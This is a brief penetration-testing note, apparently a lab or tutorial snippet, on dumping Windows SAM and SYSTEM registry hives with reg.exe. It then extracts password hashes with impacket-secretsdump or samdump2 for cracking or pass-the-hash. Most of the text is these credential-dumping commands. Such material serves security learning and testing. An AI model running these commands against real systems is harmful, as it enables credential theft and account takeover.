After having gained the Administrator access we cam dump SAM and SYSTEM using reg.exe

```powershell
reg save hklm\sam C:\temp\SAM
reg save hklm\system C:\temp\SYSTEM
```

Once copied back on the Kali machine the two files we can dump them with

```shell
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

or

```shell
samdump2 SYSTEM SAM
```

This will give us a list of userame:hash that can be cracked using hashcat's NTLM cracking or used for a Pass The Hash attack. Other ways to perform a SAM and SYSTEM credential dumping are explained [here](https://juggernaut-sec.com/dumping-credentials-sam-file-hashes/). Many scenarios about dumping SAM ad SYSTEM can be found [here](https://www.hackingarticles.in/credential-dumping-sam/).
